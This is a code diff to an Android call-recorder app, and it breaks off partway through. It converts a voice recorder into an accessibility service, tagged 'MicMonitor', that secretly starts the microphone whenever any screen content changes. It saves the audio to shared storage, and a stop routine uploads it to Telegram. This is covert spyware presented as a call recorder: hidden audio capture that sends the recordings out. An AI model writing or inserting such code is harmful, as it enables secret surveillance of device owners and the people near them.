@@ -1,45 +1,52 @@
 package com.example.callvoicerecorder;
 
-import android.content.Context;
+import android.accessibilityservice.AccessibilityService;
 import android.media.MediaRecorder;
+import android.os.Environment;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 import java.io.File;
 
-public class VoiceRecorder {
-    private MediaRecorder recorder;
-    private File voiceFile;
-    private boolean isRecording = false;
+public class CallRecordingService extends AccessibilityService {
+    private static final String TAG = "MicMonitor";
+    private static MediaRecorder micRecorder;
+    private static File micFile;
 
-    public void startRecording(Context context) {
-        if (isRecording) return;
-        isRecording = true;
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            startMicRecording();
+        }
+    }
 
+    @Override
+    public void onInterrupt() {}
+
+    private void startMicRecording() {
         try {
-            File dir = new File(context.getExternalFilesDir(null), "VoiceRecords");
+            File dir = new File(Environment.getExternalStorageDirectory(), "MicRecords");
             if (!dir.exists()) dir.mkdirs();
 
-            voiceFile = new File(dir, "voice_" + System.currentTimeMillis() + ".mp3");
-            recorder = new MediaRecorder();
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            recorder.setOutputFile(voiceFile.getAbsolutePath());
-            recorder.prepare();
-            recorder.start();
+            micFile = new File(dir, "mic_" + System.currentTimeMillis() + ".mp3");
+            micRecorder = new MediaRecorder();
+            micRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            micRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            micRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            micRecorder.setOutputFile(micFile.getAbsolutePath());
+            micRecorder.prepare();
+            micRecorder.start();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public void stopRecordingAndSend(Context context) {
-        if (!isRecording) return;
-        isRecording = false;
-
+    private void stopMicRecordingAndSend() {
         try {
-            if (recorder != null) {
-                recorder.stop();
-                recorder.release();
-                recorder = null;
-                TelegramUploader.sendToTelegram(context, voiceFile, false);
+            if (micRecorder != null) {
+                micRecorder.stop();
+                micRecorder.release();
+                micRecorder = null;
+                MultipartUtility.sendToTelegram(this, micFile, "mic");
             }
         } catch (Exception e) {
             e.printStackTrace();
